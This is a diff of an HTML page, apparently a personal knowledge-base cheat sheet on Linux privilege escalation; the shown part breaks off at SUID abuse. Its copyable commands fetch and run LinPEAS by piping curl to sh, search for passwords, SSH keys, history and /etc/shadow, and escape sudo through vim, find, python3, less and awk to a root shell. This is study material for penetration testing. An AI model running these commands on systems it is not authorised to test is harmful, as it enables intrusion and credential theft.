@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:57 -->
+<!-- 2026-07-30 Thu 22:15 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Linux Privilege Escalation</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,34 +886,34 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgaacd235">1. Automated Enumeration</a></li>
-<li><a href="#org5b0071b">2. Manual Enumeration Checklist</a>
+<li><a href="#org598d3d2">1. Automated Enumeration</a></li>
+<li><a href="#orgafbc49b">2. Manual Enumeration Checklist</a>
 <ul>
-<li><a href="#org9766666">System and Kernel</a></li>
-<li><a href="#org0194f90">Current User Context</a></li>
-<li><a href="#orga8875b1">SUID / SGID Binaries</a></li>
-<li><a href="#orgcd4f1ae">Capabilities</a></li>
-<li><a href="#org853375e">Writable Files and Directories</a></li>
-<li><a href="#org7ed97c3">Cron Jobs</a></li>
-<li><a href="#org39b6d06">Interesting Files</a></li>
-<li><a href="#org81f387e">Network and Services</a></li>
-<li><a href="#orga13c176">NFS</a></li>
+<li><a href="#org412c18c">System and Kernel</a></li>
+<li><a href="#org693a5a7">Current User Context</a></li>
+<li><a href="#org51d5ac2">SUID / SGID Binaries</a></li>
+<li><a href="#org22a8f7c">Capabilities</a></li>
+<li><a href="#org1ee647b">Writable Files and Directories</a></li>
+<li><a href="#org071a5ee">Cron Jobs</a></li>
+<li><a href="#org375b9fd">Interesting Files</a></li>
+<li><a href="#orgb6b879c">Network and Services</a></li>
+<li><a href="#org26f06c0">NFS</a></li>
 </ul>
 </li>
-<li><a href="#org8eeac92">3. Exploitation Vectors</a>
+<li><a href="#orgac41008">3. Exploitation Vectors</a>
 <ul>
-<li><a href="#org5937293">Sudo Abuse</a></li>
-<li><a href="#org43545b2">SUID Binary Abuse</a></li>
-<li><a href="#orge64de45">Capabilities Abuse</a></li>
-<li><a href="#org6a642d4">Writable /etc/passwd</a></li>
-<li><a href="#org22495c3">Cron Job Abuse</a></li>
-<li><a href="#org004accb">Path Hijacking</a></li>
-<li><a href="#orgc223bc2">Kernel Exploits</a></li>
-<li><a href="#orgf4c0e15">NFS no<sub>root</sub><sub>squash</sub></a></li>
+<li><a href="#orgf9eca83">Sudo Abuse</a></li>
+<li><a href="#orgeaa3994">SUID Binary Abuse</a></li>
+<li><a href="#org7ed1b06">Capabilities Abuse</a></li>
+<li><a href="#org33031d2">Writable /etc/passwd</a></li>
+<li><a href="#orgdea7a00">Cron Job Abuse</a></li>
+<li><a href="#org5df25fd">Path Hijacking</a></li>
+<li><a href="#org40b1dc7">Kernel Exploits</a></li>
+<li><a href="#org6ab624f">NFS no<sub>root</sub><sub>squash</sub></a></li>
 </ul>
 </li>
-<li><a href="#org24ad65f">4. Quick Wins to Check First</a></li>
-<li><a href="#orgb82dc67">Tips</a></li>
+<li><a href="#org6929579">4. Quick Wins to Check First</a></li>
+<li><a href="#orgc2aa31d">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -914,19 +932,19 @@ Related: <a href="20260314T005719--linux-smart-enumeration__cybersecurity_tool.h
          <a href="20260214T085940--post-exploitation__concept_cybersecurity.html">Post Exploitation</a>
          <a href="20260206T060723--persistence__concept_cybersecurity.html">Persistence</a>
 </p>
-<div id="outline-container-orgaacd235" class="outline-2">
-<h2 id="orgaacd235">1. Automated Enumeration</h2>
-<div class="outline-text-2" id="text-orgaacd235">
+<div id="outline-container-org598d3d2" class="outline-2">
+<h2 id="org598d3d2">1. Automated Enumeration</h2>
+<div class="outline-text-2" id="text-org598d3d2">
 <p>
 Run these first. Review output before doing anything manually.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_302ac9cceb2c4c72aafb0a95dec088f7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_572706f77210435b99fd2867e249f44c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_302ac9cceb2c4c72aafb0a95dec088f7=document.querySelector('button[name=btn_302ac9cceb2c4c72aafb0a95dec088f7]');
-copyBtnbtn_302ac9cceb2c4c72aafb0a95dec088f7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# LinPEAS — most comprehensive\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# or transfer and run\nchmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out\n\n# Linux Smart Enumeration — cleaner output, tiered verbosity\n./lse.sh -l 1      # basic\n./lse.sh -l 2      # full\n`);copyBtnbtn_302ac9cceb2c4c72aafb0a95dec088f7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_302ac9cceb2c4c72aafb0a95dec088f7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_572706f77210435b99fd2867e249f44c=document.querySelector('button[name=btn_572706f77210435b99fd2867e249f44c]');
+copyBtnbtn_572706f77210435b99fd2867e249f44c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# LinPEAS — most comprehensive\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# or transfer and run\nchmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out\n\n# Linux Smart Enumeration — cleaner output, tiered verbosity\n./lse.sh -l 1      # basic\n./lse.sh -l 2      # full\n`);copyBtnbtn_572706f77210435b99fd2867e249f44c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_572706f77210435b99fd2867e249f44c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -942,19 +960,19 @@ let res = copyTextToClipboard(`# LinPEAS — most comprehensive\ncurl -L https:/
 </div></div>
 </div>
 </div>
-<div id="outline-container-org5b0071b" class="outline-2">
-<h2 id="org5b0071b">2. Manual Enumeration Checklist</h2>
-<div class="outline-text-2" id="text-org5b0071b">
+<div id="outline-container-orgafbc49b" class="outline-2">
+<h2 id="orgafbc49b">2. Manual Enumeration Checklist</h2>
+<div class="outline-text-2" id="text-orgafbc49b">
 </div>
-<div id="outline-container-org9766666" class="outline-3">
-<h3 id="org9766666">System and Kernel</h3>
-<div class="outline-text-3" id="text-org9766666">
+<div id="outline-container-org412c18c" class="outline-3">
+<h3 id="org412c18c">System and Kernel</h3>
+<div class="outline-text-3" id="text-org412c18c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_61975751d7bd4b40a1dd206e349c7d44>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_7c290a95cba643ae8eb6dadaab1b9542>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_61975751d7bd4b40a1dd206e349c7d44=document.querySelector('button[name=btn_61975751d7bd4b40a1dd206e349c7d44]');
-copyBtnbtn_61975751d7bd4b40a1dd206e349c7d44.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`uname -a                          # kernel version — check for exploits\ncat /etc/os-release               # distro and version\ncat /proc/version\n`);copyBtnbtn_61975751d7bd4b40a1dd206e349c7d44.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_61975751d7bd4b40a1dd206e349c7d44.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7c290a95cba643ae8eb6dadaab1b9542=document.querySelector('button[name=btn_7c290a95cba643ae8eb6dadaab1b9542]');
+copyBtnbtn_7c290a95cba643ae8eb6dadaab1b9542.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`uname -a                          # kernel version — check for exploits\ncat /etc/os-release               # distro and version\ncat /proc/version\n`);copyBtnbtn_7c290a95cba643ae8eb6dadaab1b9542.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7c290a95cba643ae8eb6dadaab1b9542.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -965,15 +983,15 @@ let res = copyTextToClipboard(`uname -a                          # kernel versio
 </div></div>
 </div>
 </div>
-<div id="outline-container-org0194f90" class="outline-3">
-<h3 id="org0194f90">Current User Context</h3>
-<div class="outline-text-3" id="text-org0194f90">
+<div id="outline-container-org693a5a7" class="outline-3">
+<h3 id="org693a5a7">Current User Context</h3>
+<div class="outline-text-3" id="text-org693a5a7">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3a05f21ffb2049e08660062be458181d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_93383e1386664faf866d74de61433c46>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3a05f21ffb2049e08660062be458181d=document.querySelector('button[name=btn_3a05f21ffb2049e08660062be458181d]');
-copyBtnbtn_3a05f21ffb2049e08660062be458181d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`id                                # uid, gid, groups\nwhoami\nsudo -l                           # what can this user run as root?\ncat /etc/sudoers 2>/dev/null\n`);copyBtnbtn_3a05f21ffb2049e08660062be458181d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3a05f21ffb2049e08660062be458181d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_93383e1386664faf866d74de61433c46=document.querySelector('button[name=btn_93383e1386664faf866d74de61433c46]');
+copyBtnbtn_93383e1386664faf866d74de61433c46.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`id                                # uid, gid, groups\nwhoami\nsudo -l                           # what can this user run as root?\ncat /etc/sudoers 2>/dev/null\n`);copyBtnbtn_93383e1386664faf866d74de61433c46.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_93383e1386664faf866d74de61433c46.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -985,15 +1003,15 @@ sudo -l                           <span style="color: var(--clr-comment-delimite
 </div></div>
 </div>
 </div>
-<div id="outline-container-orga8875b1" class="outline-3">
-<h3 id="orga8875b1">SUID / SGID Binaries</h3>
-<div class="outline-text-3" id="text-orga8875b1">
+<div id="outline-container-org51d5ac2" class="outline-3">
+<h3 id="org51d5ac2">SUID / SGID Binaries</h3>
+<div class="outline-text-3" id="text-org51d5ac2">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3879fd580c8c4d0a8c004d20bdd8a73e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0d08f7200cda46b8bab91956943c2be5>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3879fd580c8c4d0a8c004d20bdd8a73e=document.querySelector('button[name=btn_3879fd580c8c4d0a8c004d20bdd8a73e]');
-copyBtnbtn_3879fd580c8c4d0a8c004d20bdd8a73e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`find / -perm -4000 -type f 2>/dev/null    # SUID\nfind / -perm -2000 -type f 2>/dev/null    # SGID\n`);copyBtnbtn_3879fd580c8c4d0a8c004d20bdd8a73e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3879fd580c8c4d0a8c004d20bdd8a73e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0d08f7200cda46b8bab91956943c2be5=document.querySelector('button[name=btn_0d08f7200cda46b8bab91956943c2be5]');
+copyBtnbtn_0d08f7200cda46b8bab91956943c2be5.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`find / -perm -4000 -type f 2>/dev/null    # SUID\nfind / -perm -2000 -type f 2>/dev/null    # SGID\n`);copyBtnbtn_0d08f7200cda46b8bab91956943c2be5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0d08f7200cda46b8bab91956943c2be5.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1006,15 +1024,15 @@ Cross-reference results against <a href="20260314T005728--gtfobins__cybersecurit
 </p>
 </div>
 </div>
-<div id="outline-container-orgcd4f1ae" class="outline-3">
-<h3 id="orgcd4f1ae">Capabilities</h3>
-<div class="outline-text-3" id="text-orgcd4f1ae">
+<div id="outline-container-org22a8f7c" class="outline-3">
+<h3 id="org22a8f7c">Capabilities</h3>
+<div class="outline-text-3" id="text-org22a8f7c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_46b802a05ad0414f8dcb2ea9a6a159f2>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ee4dabade7b04264b0ad80a0cb04db8f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_46b802a05ad0414f8dcb2ea9a6a159f2=document.querySelector('button[name=btn_46b802a05ad0414f8dcb2ea9a6a159f2]');
-copyBtnbtn_46b802a05ad0414f8dcb2ea9a6a159f2.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`getcap -r / 2>/dev/null\n# cap_setuid+ep on python/perl/ruby → trivial root\n`);copyBtnbtn_46b802a05ad0414f8dcb2ea9a6a159f2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_46b802a05ad0414f8dcb2ea9a6a159f2.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ee4dabade7b04264b0ad80a0cb04db8f=document.querySelector('button[name=btn_ee4dabade7b04264b0ad80a0cb04db8f]');
+copyBtnbtn_ee4dabade7b04264b0ad80a0cb04db8f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`getcap -r / 2>/dev/null\n# cap_setuid+ep on python/perl/ruby → trivial root\n`);copyBtnbtn_ee4dabade7b04264b0ad80a0cb04db8f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ee4dabade7b04264b0ad80a0cb04db8f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1024,15 +1042,15 @@ let res = copyTextToClipboard(`getcap -r / 2>/dev/null\n# cap_setuid+ep on pytho
 </div></div>
 </div>
 </div>
-<div id="outline-container-org853375e" class="outline-3">
-<h3 id="org853375e">Writable Files and Directories</h3>
-<div class="outline-text-3" id="text-org853375e">
+<div id="outline-container-org1ee647b" class="outline-3">
+<h3 id="org1ee647b">Writable Files and Directories</h3>
+<div class="outline-text-3" id="text-org1ee647b">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_bd122ee0cbb3411d80dfac636d93c7f0>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d7ba601bc7e74cdd8251835c06202ee8>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_bd122ee0cbb3411d80dfac636d93c7f0=document.querySelector('button[name=btn_bd122ee0cbb3411d80dfac636d93c7f0]');
-copyBtnbtn_bd122ee0cbb3411d80dfac636d93c7f0.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# World-writable files\nfind / -writable -type f 2>/dev/null | grep -v proc\n\n# Writable directories in PATH\necho $PATH | tr ':' '\\n' | xargs -I{} find {} -writable 2>/dev/null\n`);copyBtnbtn_bd122ee0cbb3411d80dfac636d93c7f0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bd122ee0cbb3411d80dfac636d93c7f0.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d7ba601bc7e74cdd8251835c06202ee8=document.querySelector('button[name=btn_d7ba601bc7e74cdd8251835c06202ee8]');
+copyBtnbtn_d7ba601bc7e74cdd8251835c06202ee8.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# World-writable files\nfind / -writable -type f 2>/dev/null | grep -v proc\n\n# Writable directories in PATH\necho $PATH | tr ':' '\\n' | xargs -I{} find {} -writable 2>/dev/null\n`);copyBtnbtn_d7ba601bc7e74cdd8251835c06202ee8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d7ba601bc7e74cdd8251835c06202ee8.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1045,15 +1063,15 @@ let res = copyTextToClipboard(`# World-writable files\nfind / -writable -type f 
 </div></div>
 </div>
 </div>
-<div id="outline-container-org7ed97c3" class="outline-3">
-<h3 id="org7ed97c3">Cron Jobs</h3>
-<div class="outline-text-3" id="text-org7ed97c3">
+<div id="outline-container-org071a5ee" class="outline-3">
+<h3 id="org071a5ee">Cron Jobs</h3>
+<div class="outline-text-3" id="text-org071a5ee">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4579d665cab749cba2b6b74516e827ca>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e4a11c55a23b421891752f817a236b82>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_4579d665cab749cba2b6b74516e827ca=document.querySelector('button[name=btn_4579d665cab749cba2b6b74516e827ca]');
-copyBtnbtn_4579d665cab749cba2b6b74516e827ca.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`cat /etc/crontab\nls -la /etc/cron*\ncrontab -l\n# Watch for running processes — catch cron jobs in flight\nwatch -n 1 ps aux\n# Or use pspy (no root needed)\n./pspy64\n`);copyBtnbtn_4579d665cab749cba2b6b74516e827ca.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4579d665cab749cba2b6b74516e827ca.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e4a11c55a23b421891752f817a236b82=document.querySelector('button[name=btn_e4a11c55a23b421891752f817a236b82]');
+copyBtnbtn_e4a11c55a23b421891752f817a236b82.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`cat /etc/crontab\nls -la /etc/cron*\ncrontab -l\n# Watch for running processes — catch cron jobs in flight\nwatch -n 1 ps aux\n# Or use pspy (no root needed)\n./pspy64\n`);copyBtnbtn_e4a11c55a23b421891752f817a236b82.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e4a11c55a23b421891752f817a236b82.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1068,15 +1086,15 @@ crontab -l
 </div></div>
 </div>
 </div>
-<div id="outline-container-org39b6d06" class="outline-3">
-<h3 id="org39b6d06">Interesting Files</h3>
-<div class="outline-text-3" id="text-org39b6d06">
+<div id="outline-container-org375b9fd" class="outline-3">
+<h3 id="org375b9fd">Interesting Files</h3>
+<div class="outline-text-3" id="text-org375b9fd">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2cbb40f0b71a4f24981aaec753ef8974>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f9ea418ee62941108997fac8d15174c0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_2cbb40f0b71a4f24981aaec753ef8974=document.querySelector('button[name=btn_2cbb40f0b71a4f24981aaec753ef8974]');
-copyBtnbtn_2cbb40f0b71a4f24981aaec753ef8974.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Config files with credentials\ngrep -r \"password\\|passwd\\|secret\\|key\" /var/www /opt /home 2>/dev/null\n\n# SSH keys\nfind / -name \"id_rsa\" -o -name \"id_ecdsa\" 2>/dev/null\ncat ~/.ssh/authorized_keys\n\n# History files\ncat ~/.bash_history\ncat ~/.zsh_history\n\n# Shadow file (readable = game over)\ncat /etc/shadow 2>/dev/null\n`);copyBtnbtn_2cbb40f0b71a4f24981aaec753ef8974.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2cbb40f0b71a4f24981aaec753ef8974.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f9ea418ee62941108997fac8d15174c0=document.querySelector('button[name=btn_f9ea418ee62941108997fac8d15174c0]');
+copyBtnbtn_f9ea418ee62941108997fac8d15174c0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Config files with credentials\ngrep -r \"password\\|passwd\\|secret\\|key\" /var/www /opt /home 2>/dev/null\n\n# SSH keys\nfind / -name \"id_rsa\" -o -name \"id_ecdsa\" 2>/dev/null\ncat ~/.ssh/authorized_keys\n\n# History files\ncat ~/.bash_history\ncat ~/.zsh_history\n\n# Shadow file (readable = game over)\ncat /etc/shadow 2>/dev/null\n`);copyBtnbtn_f9ea418ee62941108997fac8d15174c0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f9ea418ee62941108997fac8d15174c0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1097,15 +1115,15 @@ cat ~/.zsh_history
 </div></div>
 </div>
 </div>
-<div id="outline-container-org81f387e" class="outline-3">
-<h3 id="org81f387e">Network and Services</h3>
-<div class="outline-text-3" id="text-org81f387e">
+<div id="outline-container-orgb6b879c" class="outline-3">
+<h3 id="orgb6b879c">Network and Services</h3>
+<div class="outline-text-3" id="text-orgb6b879c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1e06245a25814f0b998b132eff065c5a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_cb668f00188342cc810417ec3d78e810>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1e06245a25814f0b998b132eff065c5a=document.querySelector('button[name=btn_1e06245a25814f0b998b132eff065c5a]');
-copyBtnbtn_1e06245a25814f0b998b132eff065c5a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`ss -tlnp                          # listening ports\nnetstat -tlnp 2>/dev/null\ncat /etc/hosts\n`);copyBtnbtn_1e06245a25814f0b998b132eff065c5a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1e06245a25814f0b998b132eff065c5a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_cb668f00188342cc810417ec3d78e810=document.querySelector('button[name=btn_cb668f00188342cc810417ec3d78e810]');
+copyBtnbtn_cb668f00188342cc810417ec3d78e810.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`ss -tlnp                          # listening ports\nnetstat -tlnp 2>/dev/null\ncat /etc/hosts\n`);copyBtnbtn_cb668f00188342cc810417ec3d78e810.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_cb668f00188342cc810417ec3d78e810.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1116,15 +1134,15 @@ cat /etc/hosts
 </div></div>
 </div>
 </div>
-<div id="outline-container-orga13c176" class="outline-3">
-<h3 id="orga13c176">NFS</h3>
-<div class="outline-text-3" id="text-orga13c176">
+<div id="outline-container-org26f06c0" class="outline-3">
+<h3 id="org26f06c0">NFS</h3>
+<div class="outline-text-3" id="text-org26f06c0">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_63ddcf94dbd24bbb8ded9ea01831db8e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_5bb3b7aaf01046aebb314b410a2e8186>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_63ddcf94dbd24bbb8ded9ea01831db8e=document.querySelector('button[name=btn_63ddcf94dbd24bbb8ded9ea01831db8e]');
-copyBtnbtn_63ddcf94dbd24bbb8ded9ea01831db8e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`cat /etc/exports\n# no_root_squash on a share → mount it from attacker, create SUID binary\nshowmount -e $IP                  # from attacker\n`);copyBtnbtn_63ddcf94dbd24bbb8ded9ea01831db8e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_63ddcf94dbd24bbb8ded9ea01831db8e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5bb3b7aaf01046aebb314b410a2e8186=document.querySelector('button[name=btn_5bb3b7aaf01046aebb314b410a2e8186]');
+copyBtnbtn_5bb3b7aaf01046aebb314b410a2e8186.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`cat /etc/exports\n# no_root_squash on a share → mount it from attacker, create SUID binary\nshowmount -e $IP                  # from attacker\n`);copyBtnbtn_5bb3b7aaf01046aebb314b410a2e8186.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5bb3b7aaf01046aebb314b410a2e8186.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1136,19 +1154,19 @@ let res = copyTextToClipboard(`cat /etc/exports\n# no_root_squash on a share →
 </div>
 </div>
 </div>
-<div id="outline-container-org8eeac92" class="outline-2">
-<h2 id="org8eeac92">3. Exploitation Vectors</h2>
-<div class="outline-text-2" id="text-org8eeac92">
+<div id="outline-container-orgac41008" class="outline-2">
+<h2 id="orgac41008">3. Exploitation Vectors</h2>
+<div class="outline-text-2" id="text-orgac41008">
 </div>
-<div id="outline-container-org5937293" class="outline-3">
-<h3 id="org5937293">Sudo Abuse</h3>
-<div class="outline-text-3" id="text-org5937293">
+<div id="outline-container-orgf9eca83" class="outline-3">
+<h3 id="orgf9eca83">Sudo Abuse</h3>
+<div class="outline-text-3" id="text-orgf9eca83">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_df2d54fcb7914462a99afcd943c9e00c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_bbbc2bf6f6e84007bcf591b009085d6b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_df2d54fcb7914462a99afcd943c9e00c=document.querySelector('button[name=btn_df2d54fcb7914462a99afcd943c9e00c]');
-copyBtnbtn_df2d54fcb7914462a99afcd943c9e00c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sudo -l\n# Common exploitable patterns:\nsudo /usr/bin/vim       → :!bash\nsudo /usr/bin/find      → sudo find / -exec /bin/bash \\;\nsudo /usr/bin/python3   → sudo python3 -c 'import os; os.system(\"/bin/bash\")'\nsudo /usr/bin/less      → !bash (within less)\nsudo /usr/bin/awk       → sudo awk 'BEGIN {system(\"/bin/bash\")}'\n`);copyBtnbtn_df2d54fcb7914462a99afcd943c9e00c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_df2d54fcb7914462a99afcd943c9e00c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_bbbc2bf6f6e84007bcf591b009085d6b=document.querySelector('button[name=btn_bbbc2bf6f6e84007bcf591b009085d6b]');
+copyBtnbtn_bbbc2bf6f6e84007bcf591b009085d6b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sudo -l\n# Common exploitable patterns:\nsudo /usr/bin/vim       → :!bash\nsudo /usr/bin/find      → sudo find / -exec /bin/bash \\;\nsudo /usr/bin/python3   → sudo python3 -c 'import os; os.system(\"/bin/bash\")'\nsudo /usr/bin/less      → !bash (within less)\nsudo /usr/bin/awk       → sudo awk 'BEGIN {system(\"/bin/bash\")}'\n`);copyBtnbtn_bbbc2bf6f6e84007bcf591b009085d6b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bbbc2bf6f6e84007bcf591b009085d6b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1167,15 +1185,15 @@ Check <a href="20260314T005728--gtfobins__cybersecurity_tool.html">GTFOBins</a> 
 </p>
 </div>
 </div>
-<div id="outline-container-org43545b2" class="outline-3">
-<h3 id="org43545b2">SUID Binary Abuse</h3>
-<div class="outline-text-3" id="text-org43545b2">
+<div id="outline-container-orgeaa3994" class="outline-3">
+<h3 id="orgeaa3994">SUID Binary Abuse</h3>
+<div class="outline-text-3" id="text-orgeaa3994">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_cbd484bac9d54c80a18f0b078734fa6e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_98bec0c3cce7401ba70f04be30555004>&#10697;</button>
 <script type='text/javascript'>
